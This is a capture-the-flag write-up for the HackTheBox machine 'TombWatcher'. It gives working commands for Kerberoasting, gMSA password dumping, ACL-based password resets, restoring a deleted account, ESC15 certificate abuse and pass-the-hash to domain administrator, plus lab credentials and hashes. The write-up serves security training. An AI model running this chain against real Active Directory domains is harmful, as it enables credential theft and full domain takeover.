# TombWatcher — HackTheBox Writeup

**Difficulty:** Hard  
**OS:** Windows (Active Directory)  
**Author:** [J0$tif](https://jostif.pages.dev)  
**HTB Profile:** [https://app.hackthebox.com/users/2209690](https://app.hackthebox.com/users/2209690)  
**Topics:** Kerberoasting, gMSA Abuse, ForceChangePassword, WriteOwner, Deleted Object Restore, ESC15 (CVE-2024-49019), Enrollment Agent Abuse

---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Foothold — Kerberoasting Alfred](#2-foothold--kerberoasting-alfred)
3. [Privilege Escalation — AddSelf to Infrastructure](#3-privilege-escalation--addself-to-infrastructure)
4. [gMSA Password Dump — ansible_dev$](#4-gmsa-password-dump--ansible_dev)
5. [Lateral Movement — ForceChangePassword to sam](#5-lateral-movement--forcechangepassword-to-sam)
6. [Lateral Movement — WriteOwner to john](#6-lateral-movement--writeowner-to-john)
7. [User Flag](#7-user-flag)
8. [Privilege Escalation — Restoring cert_admin (Deleted Object)](#8-privilege-escalation--restoring-cert_admin-deleted-object)
9. [Root — ESC15 + Enrollment Agent Abuse](#9-root--esc15--enrollment-agent-abuse)
10. [What Failed and Why](#10-what-failed-and-why)
11. [Full Attack Chain Summary](#11-full-attack-chain-summary)
12. [Key Concepts Explained](#12-key-concepts-explained)

---

## 1. Enumeration

### Nmap

We start with a full port scan:

```bash
nmap --privileged -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.232.167
```

Key open ports:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | IIS 10.0 |
| 88 | Kerberos | Windows KDC |
| 389/636 | LDAP/LDAPS | Active Directory |
| 445 | SMB | Signing required |
| 5985 | WinRM | Remote management |

The domain is `tombwatcher.htb`, DC hostname is `DC01.tombwatcher.htb`.

> **Beginner note:** Seeing ports 88 (Kerberos), 389 (LDAP), and 445 (SMB) together instantly tells us this is a Domain Controller. Port 5985 (WinRM) is important — if we get credentials for a user in the `Remote Management Users` group, we can get a shell.

**Important:** Nmap also tells us the clock skew is **+4 hours**. This matters for Kerberos — Kerberos requires clocks to be within 5 minutes of each other. We will need to account for this throughout the box.

### SMB Enumeration

We were given starting credentials `henry:H3nry_987TGV!`. Let's validate and enumerate:

```bash
nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!'
nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --users
nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --shares
```

Users found: `Administrator`, `Guest`, `krbtgt`, `Henry`, `Alfred`, `sam`, `john`

Shares: Only standard DC shares (NETLOGON, SYSVOL) — nothing interesting.

### BloodHound

```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.129.232.167 -c All --zip
```

> **Beginner note:** BloodHound is a tool that maps Active Directory relationships and attack paths visually. It collects data like group memberships, ACLs, and session info, then lets you find paths from a low-privilege user to Domain Admin using graph theory.

BloodHound collected successfully (it fell back to NTLM auth due to clock skew). Load the ZIP into the BloodHound GUI to visualize attack paths.

---

## 2. Foothold — Kerberoasting Alfred

### What is Kerberoasting?

Kerberoasting is an attack against Kerberos Service Principal Names (SPNs). Any domain user can request a Kerberos service ticket for any account with an SPN. That ticket is encrypted with the service account's password hash. We can take it offline and crack it.

We use `targetedKerberoast.py` which temporarily adds SPNs to users without them, requests tickets, then cleans up.

### The Clock Skew Problem

```bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
# Error: KRB_AP_ERR_SKEW(Clock skew too great)
```

Kerberos rejected our request because our clock is 4 hours behind the DC. Even after running `ntpdate` to sync, the tool still failed — because the system time was updated but the tool was already running.

**The fix — faketime:**

```bash
faketime -f "+4h" python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

`faketime` is a Linux tool that tricks a process into thinking the system time is different. `-f "+4h"` means "add 4 hours to the perceived time". This makes Kerberos happy without actually changing the system clock.

> **Why `+4h` and not just `ntpdate`?** `ntpdate` syncs the system clock, but other processes (like our shell) may have cached the old time. `faketime` patches the time at the library level for just that one process, making it more reliable for Kerberos attacks when you can't or don't want to change the system clock permanently.

### Result

Alfred had an SPN added and a TGS ticket returned:

```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$09bd27a6...
```

### Cracking the Hash

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

**Result:** `alfred:basketball` — cracked in under 1 second.

```bash
nxc smb 10.129.232.167 -u alfred -p 'basketball'
# [+] tombwatcher.htb\alfred:basketball
```

---

## 3. Privilege Escalation — AddSelf to Infrastructure

BloodHound shows alfred has **AddSelf** rights over the `Infrastructure` group. This means alfred can add himself to that group.

### What is AddSelf?

`AddSelf` is an ACE (Access Control Entry) that grants a principal the right to add themselves to a group's member list. It's a specific write permission on the `member` attribute of the group object, scoped only to the requesting principal.

### Why `net rpc` Failed

```bash
net rpc group addmem "Infrastructure" "alfred" -U "tombwatcher"/"alfred"%"basketball" -S "DC01.tombwatcher.htb"
# NT_STATUS_ACCESS_DENIED
```

`net rpc` uses the SAMR protocol over SMB/RPC. SAMR enforces different ACLs than LDAP. The `AddSelf` ACE is a LDAP-level permission on the `member` attribute — SAMR doesn't honor it.

### The Fix — bloodyAD

```bash
faketime -f "+4h" bloodyAD -u alfred -p 'basketball' -d tombwatcher.htb --host DC01.tombwatcher.htb add groupMember "Infrastructure" "alfred"
# [+] alfred added to Infrastructure
```

`bloodyAD` communicates directly over LDAP, so it correctly applies the `AddSelf` ACE.

---

## 4. gMSA Password Dump — ansible_dev$

BloodHound shows the `Infrastructure` group has **ReadGMSAPassword** over `ansible_dev$`.

### What is a gMSA?

A Group Managed Service Account (gMSA) is a special AD account whose password is automatically managed by the DC and rotated periodically. The password is stored in the `msDS-ManagedPassword` LDAP attribute. Only principals listed in `PrincipalsAllowedToReadPassword` can read it.

### The PAC Problem

After adding alfred to Infrastructure, simply running gMSADumper still failed:

```bash
python3 ~/tools/gMSADumper/gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
# Users or groups who can read password for ansible_dev$:
#  > Infrastructure
# (no hash returned)
```

**Why?** The DC enforces the `ReadGMSAPassword` ACL based on the **PAC** (Privilege Attribute Certificate) embedded in alfred's Kerberos ticket. The PAC is built at TGT issuance time and lists the groups the user belonged to **at that moment**. Alfred's existing TGT was issued *before* we added him to Infrastructure, so the PAC didn't include it.

**The fix:** Get a fresh TGT *after* the group add, all within one `faketime` context:

```bash
faketime -f "+4h" bash -c '
  bloodyAD -u alfred -p basketball -d tombwatcher.htb --host DC01.tombwatcher.htb add groupMember Infrastructure alfred &&
  getTGT.py tombwatcher.htb/alfred:basketball -dc-ip 10.129.232.167 &&
  export KRB5CCNAME=alfred.ccache &&
  bloodyAD -k -d tombwatcher.htb --host DC01.tombwatcher.htb get object "ansible_dev$" --attr msDS-ManagedPassword
'
```

**Result:**
```
msDS-ManagedPassword.NT: cba56cd2df7d642f622e2a59956f6d47
```

> **Key lesson:** In AD, many access control checks are PAC-based, not live-membership-based. If you add a user to a group, existing tickets won't reflect that membership. You must obtain a new TGT after the group modification.

---

## 5. Lateral Movement — ForceChangePassword to sam

BloodHound shows `ansible_dev$` has **ForceChangePassword** over `sam`.

### Why `net rpc` Failed Again

```bash
net rpc password "sam" "Password123" -U "tombwatcher"/"ansible_dev$"%"cba56cd2df7d642f622e2a59956f6d47" -S "DC01.tombwatcher.htb"
# session setup failed: NT_STATUS_LOGON_FAILURE
```

`net rpc` expects a **plaintext password** in the `-U user%password` field. We only have an NT hash — passing the hash as plaintext doesn't work. NTLM authentication requires the hash to be used in the challenge-response protocol, not literally as a password string.

### The Fix — PTH via Kerberos + bloodyAD

```bash
# Get TGT using the NT hash (Pass-the-Hash → Kerberos)
faketime -f "+4h" getTGT.py tombwatcher.htb/'ansible_dev$' -hashes ':cba56cd2df7d642f622e2a59956f6d47' -dc-ip 10.129.232.167

export KRB5CCNAME=ansible_dev\$.ccache

# Use the TGT with bloodyAD (-k = use Kerberos)
faketime -f "+4h" bloodyAD -k -u 'ansible_dev$' -d tombwatcher.htb --host DC01.tombwatcher.htb set password sam 'Password123!'
# [+] Password changed successfully!
```

`getTGT.py` converts an NT hash into a valid Kerberos TGT (this is overpass-the-hash). bloodyAD then uses that ticket to authenticate to LDAP and change sam's password.

---

## 6. Lateral Movement — WriteOwner to john

BloodHound shows `sam` has **WriteOwner** over `john`.

### The Attack Chain

**WriteOwner** lets sam make himself the owner of john's AD object. As owner, sam can then modify john's DACL to grant himself FullControl, then force-change john's password.

**Step 1: Change owner of john to sam**

```bash
faketime -f "+4h" owneredit.py -action write -new-owner 'sam' -target 'john' -dc-ip 10.129.232.167 'tombwatcher.htb'/'sam':'Password123!'
# [*] OwnerSid modified successfully!
```

**Step 2: Grant sam FullControl on john's DACL**

```bash
faketime -f "+4h" dacledit.py -action write -rights FullControl -principal 'sam' -target 'john' -dc-ip 10.129.232.167 'tombwatcher.htb'/'sam':'Password123!'
# [*] DACL modified successfully!
```

> **Why does this need two steps?** Ownership and DACL are separate security concepts in Windows. The owner of an object can always modify its DACL, but until sam is the owner, he can't write the DACL even with WriteOwner. The order is: become owner → write DACL → exploit.

**Step 3: Force-change john's password**

```bash
faketime -f "+4h" bloodyAD -u 'sam' -p 'Password123!' -d tombwatcher.htb --host DC01.tombwatcher.htb set password john 'Password123!'
```

**Step 4: WinRM as john**

```bash
nxc winrm 10.129.232.167 -u john -p 'Password123!'
# [+] tombwatcher.htb\john:Password123! (Pwn3d!)

evil-winrm -i 10.129.232.167 -u john -p 'Password123!'
```

---

## 7. User Flag

```powershell
*Evil-WinRM* PS C:\Users\john\desktop> cat user.txt
96a23c3034a1a86bf981f6c7e356c9c4
```

---

## 8. Privilege Escalation — Restoring cert_admin (Deleted Object)

### BloodHound Finding

BloodHound shows john has **GenericAll** over the `OU=ADCS` organizational unit.

### What is GenericAll on an OU?

GenericAll means full control over the OU object itself. However, it does **not** automatically propagate to child objects if those child objects have `adminCount=1` or if inheritance is blocked. The ADCS OU was empty — so direct child manipulation was useless.

### ADCS Enumeration

```bash
faketime -f "+4h" certipy-ad find -u john@tombwatcher.htb -p 'Password123!' -dc-ip 10.129.232.167 -vulnerable -stdout
```

Certipy found a vulnerable template: **WebServer**

```
Template Name         : WebServer
Enrollee Supplies Subject : True
Schema Version        : 1
Client Authentication : False
Enrollment Rights     : S-1-5-21-1392491010-1358638721-2126982587-1111
Vulnerabilities       : ESC15
```

The SID `...1111` (RID 1111) has enroll rights on the template. But who is RID 1111?

### Finding the Deleted Object

```bash
faketime -f "+4h" ldapsearch -H ldap://10.129.232.167 -D 'john@tombwatcher.htb' -w 'Password123!' \
  -b 'DC=tombwatcher,DC=htb' -E '1.2.840.113556.1.4.417' '(isDeleted=TRUE)' sAMAccountName objectSid
```

> **What is `1.2.840.113556.1.4.417`?** This is the OID for the Microsoft LDAP "Show Deleted Objects" control. By default, AD hides tombstoned (deleted) objects from LDAP queries. Passing this OID as a critical control tells the DC to include them. Without it, deleted objects are invisible.

Three deleted `cert_admin` accounts were found. Decoding their base64-encoded SIDs:

- `cert_admin` GUID `f80369c8...` → RID **1109**  
- `cert_admin` GUID `c1f1f0fe...` → RID **1110**  
- `cert_admin` GUID `938182c3...` → RID **1111** ← this is the one with enroll rights

The intended account was deleted (three times — the box resets it periodically). We need to restore it.

### Restoring the Deleted Object

```bash
faketime -f "+4h" ldapmodify -H ldap://10.129.232.167 -D 'john@tombwatcher.htb' -w 'Password123!' \
  -e \!1.2.840.113556.1.4.417 <<EOF
dn: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
changetype: modify
delete: isDeleted
-
replace: distinguishedName
distinguishedName: CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
EOF
```

The `-e \!1.2.840.113556.1.4.417` passes the "Show Deleted Objects" control critically to the modify operation — required because without it, `ldapmodify` can't see (and thus can't modify) tombstoned objects.

> **Why can john do this?** John has GenericAll on `OU=ADCS`. The original `LastKnownParent` of cert_admin was `OU=ADCS`. Restoring an object requires write access to the destination container — john's GenericAll on the OU grants exactly that.

### Fixing the Restored Account

The restored cert_admin had UAC flag `66048` (`NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD`) but its password was in a stale state from before deletion. The box also runs a cleanup task that re-deletes cert_admin periodically, so we need to act fast.

In evil-winrm as john:

```powershell
Set-ADUser cert_admin -Enabled $true
Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Reset
```

Verify:

```bash
nxc smb 10.129.232.167 -u cert_admin -p 'Password123!'
# [+] tombwatcher.htb\cert_admin:Password123!
```

---

## 9. Root — ESC15 + Enrollment Agent Abuse

### What is ESC15?

ESC15 (CVE-2024-49019), nicknamed **"EKUwu"**, is a vulnerability in **Schema Version 1** certificate templates. 

In modern templates (Schema v2+), the CA validates that the application policies in a certificate request match what the template allows. In Schema v1 templates, **no such validation exists** — the CA will embed whatever application policy the enrollee requests into the issued certificate.

Combined with `EnrolleeSuppliesSubject: True` (the enrollee can specify any SAN/UPN), this is extremely powerful.

### Why not use Client Authentication directly?

We first tried requesting a cert with the Client Authentication OID (`1.3.6.1.5.5.7.3.2`) to authenticate to Kerberos via PKINIT:

```bash
faketime -f "+4h" certipy-ad req -u cert_admin@tombwatcher.htb -p 'Password123!' \
  -dc-ip 10.129.232.167 -ca 'tombwatcher-CA-1' -template 'WebServer' \
  -upn 'administrator@tombwatcher.htb' \
  -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
  -application-policies '1.3.6.1.5.5.7.3.2'
```

The cert was issued, but certipy auth failed:

```
[-] Certificate is not valid for client authentication
```

The KDC checks the **extended key usage** extension, not the **application policies** extension. The CA embedded Client Authentication in the Application Policies extension (as requested) but the WebServer template's defined EKU only had `Server Authentication` in the standard EKU extension. The KDC saw `Server Authentication` in EKU and rejected it for PKINIT.

### The Enrollment Agent Approach

Instead of requesting Client Authentication, we request the **Enrollment Agent** application policy OID (`1.3.6.1.4.1.311.20.2.1`). An Enrollment Agent certificate allows enrolling **on behalf of another user** on any template that permits it.

**Step 1: Get an Enrollment Agent cert via ESC15**

```bash
faketime -f "+4h" certipy-ad req -u cert_admin@tombwatcher.htb -p 'Password123!' \
  -dc-ip 10.129.232.167 -ca 'tombwatcher-CA-1' -template 'WebServer' \
  -upn 'administrator@tombwatcher.htb' \
  -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' \
  -application-policies '1.3.6.1.4.1.311.20.2.1'
```

**Step 2: Use the Enrollment Agent cert to enroll on behalf of Administrator via the User template**

The `User` template supports Client Authentication and allows enrollment agents to enroll on behalf of users.

```bash
faketime -f "+4h" certipy-ad req -u cert_admin@tombwatcher.htb -p 'Password123!' \
  -dc-ip 10.129.232.167 -ca 'tombwatcher-CA-1' -template 'User' \
  -on-behalf-of 'tombwatcher\administrator' \
  -pfx administrator.pfx
```

This issues a proper `User` template certificate (which has Client Authentication EKU) for `administrator@tombwatcher.htb`, signed by our Enrollment Agent cert.

**Step 3: Authenticate and get the NT hash**

```bash
faketime -f "+4h" certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.167 -domain tombwatcher.htb
# [*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

**Step 4: Pass-the-Hash → Shell**

```bash
evil-winrm -i 10.129.232.167 -u Administrator -H f61db423bebe3328d33af26741afe5fc
```

### Root Flag

```powershell
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
0b5863792d6b95c4ba433e83ddb8cb2c
```

---

## 10. What Failed and Why

### 10.1 Clock Skew — `ntpdate` didn't fix Kerberos

**What happened:** Running `sudo ntpdate 10.129.232.167` stepped the system clock forward by 4 hours. But Kerberos tools still failed.

**Why:** `ntpdate` modifies the system clock for new processes. However, the shell session and tool invocations that were already running had cached the old time. Additionally, some tools internally calculate time offsets at startup.

**Fix:** Use `faketime -f "+4h"` to patch time at the library level for each individual process.

### 10.2 `net rpc group addmem` — AddSelf failed

**Why:** `net rpc` uses SAMR protocol which enforces different ACLs than LDAP. The `AddSelf` right is an LDAP ACE on the `member` attribute. SAMR doesn't honor it.

**Fix:** Use `bloodyAD` which communicates directly over LDAP.

### 10.3 gMSA read returned no hash (PAC issue)

**Why:** After adding alfred to Infrastructure, existing TGTs had PACs that didn't include the new group. LDAP attribute access for `msDS-ManagedPassword` is PAC-evaluated, not live-evaluated.

**Fix:** Obtain a fresh TGT immediately after the group add within the same `faketime` context.

### 10.4 bloodyAD `-H` with `-p dummy` failed

**Why:** bloodyAD's LDAP bind uses the password field for authentication negotiation. Passing `-H` (hash) alongside a dummy password caused an invalid credentials error because bloodyAD attempted to bind with the dummy password first.

**Fix:** Use `getTGT.py -hashes` to convert the NT hash to a Kerberos TGT, then use `bloodyAD -k` to authenticate via Kerberos.

### 10.5 `owneredit.py` / `dacledit.py` — "not found in LDAP"

**Why:** Both tools search only the **domain naming context** (`DC=tombwatcher,DC=htb`) by default. The CA enrollment services object lives in the **configuration partition** (`CN=Configuration,DC=tombwatcher,DC=htb`), which is a separate LDAP base. The tools couldn't find it.

**Fix:** This path was ultimately not the intended route. The real path was restoring the deleted cert_admin account.

### 10.6 Deleted object not visible to `ldapmodify`

**Why:** Without the "Show Deleted Objects" LDAP control (OID `1.2.840.113556.1.4.417`), the DC hides tombstoned objects from all LDAP operations including modify.

**Fix:** Pass `-e \!1.2.840.113556.1.4.417` to `ldapmodify`. The `!` makes it a critical control (the DC must honor it or fail the operation).

### 10.7 ESC15 with Client Authentication OID — cert issued but PKINIT failed

**Why:** The CA embedded the Client Authentication OID in the **Application Policies** extension (as requested via ESC15). But the KDC checks the standard **Extended Key Usage** extension for PKINIT. The template's defined EKU only had `Server Authentication` — the CA didn't override the EKU extension.

**Fix:** Use the **Enrollment Agent** OID instead. This cert is then used to enroll on-behalf-of Administrator via the `User` template, which legitimately has Client Authentication in its EKU.

### 10.8 PassTheCert ldap-shell — couldn't find objects

**Why:** The Schannel (LDAPS certificate-based) bind authenticated successfully at TLS level but the session had no domain context for LDAP searches. The first cert had no `objectSid` embedded, so the DC couldn't map it to an AD principal, resulting in an anonymous-like LDAP session.

**Fix:** Ultimately superseded by the Enrollment Agent approach which was cleaner.

### 10.9 cert_admin SMB auth failure after restore

**Why:** The restored deleted object had stale UAC flags and a password in an indeterminate state. The DC refused SMB/RPC authentication.

**Fix:** After restoring, immediately use evil-winrm as john to call `Set-ADUser cert_admin -Enabled $true` and reset the password via `Set-ADAccountPassword`.

---

## 11. Full Attack Chain Summary

```
henry:H3nry_987TGV! (given)
    │
    ├─► Targeted Kerberoast (faketime +4h)
    │       └─► Alfred TGS → hashcat → alfred:basketball
    │
    ├─► alfred AddSelf → Infrastructure (bloodyAD, LDAP)
    │
    ├─► Infrastructure ReadGMSAPassword → ansible_dev$ NT hash
    │       (fresh TGT required after group add — PAC issue)
    │
    ├─► ansible_dev$ ForceChangePassword → sam:Password123!
    │       (PTH via getTGT.py → bloodyAD -k)
    │
    ├─► sam WriteOwner → john
    │       owneredit → dacledit → ForceChangePassword
    │       john:Password123! + WinRM → USER FLAG
    │
    ├─► john GenericAll on OU=ADCS
    │       ├─► Enumerate deleted objects (Show Deleted Objects control)
    │       ├─► Identify cert_admin RID 1111 (has WebServer enroll rights)
    │       ├─► Restore cert_admin via ldapmodify + control OID
    │       ├─► Fix UAC flags + reset password via evil-winrm
    │       └─► cert_admin:Password123!
    │
    └─► ESC15 (CVE-2024-49019) on WebServer template (Schema v1)
            ├─► Request with Enrollment Agent OID → administrator.pfx (agent cert)
            ├─► Enroll on-behalf-of Administrator via User template
            ├─► certipy auth → Administrator NT hash
            └─► PTH → evil-winrm → ROOT FLAG
```

---

## 12. Key Concepts Explained

### Kerberos Clock Skew
Kerberos requires all parties to have clocks within 5 minutes of each other to prevent replay attacks. On HTB machines (and in real engagements), DCs often run in a different timezone or have drifted clocks. Use `faketime` to adjust your tool's perceived time without touching the system clock.

### PAC (Privilege Attribute Certificate)
The PAC is a Microsoft extension to Kerberos tickets that encodes the user's group memberships, SID, and privileges. It is generated when the TGT is issued and does not update dynamically. If you add a user to a group, you must get a new TGT for that membership to be reflected in LDAP access control checks.

### gMSA (Group Managed Service Account)
A special AD account type whose 256-byte random password is managed and rotated automatically by the DC. The password is readable (as an NT hash) by members of the `PrincipalsAllowedToReadPassword` attribute. Commonly used to run services without storing passwords.

### Tombstoning / Deleted Objects in AD
When an object is deleted in AD, it's not immediately removed. It's moved to `CN=Deleted Objects`, most attributes are stripped, and it becomes a "tombstone." The tombstone is retained for a configurable period (default 180 days). With the right permissions, it can be restored (`undeleted`) — preserving its original SID and GUID.

### ESC15 (CVE-2024-49019) — EKUwu
Schema Version 1 certificate templates predate the concept of Application Policies validation. When a CA issues from a Schema v1 template, it does not validate that the requested application policies match the template's configuration. An enrollee can inject arbitrary OIDs — including Enrollment Agent — into the certificate. This was disclosed in November 2024 and affects unpatched environments.

### Enrollment Agent Abuse (ESC3)
An Enrollment Agent certificate (containing OID `1.3.6.1.4.1.311.20.2.1`) allows a user to request certificates on behalf of other users. Combined with ESC15 (to obtain the agent cert via a Schema v1 template), this becomes a full privilege escalation path to Domain Admin.

---

*Written by [J0$tif](https://jostif.pages.dev) | HTB Profile: [https://app.hackthebox.com/users/2209690](https://app.hackthebox.com/users/2209690)*
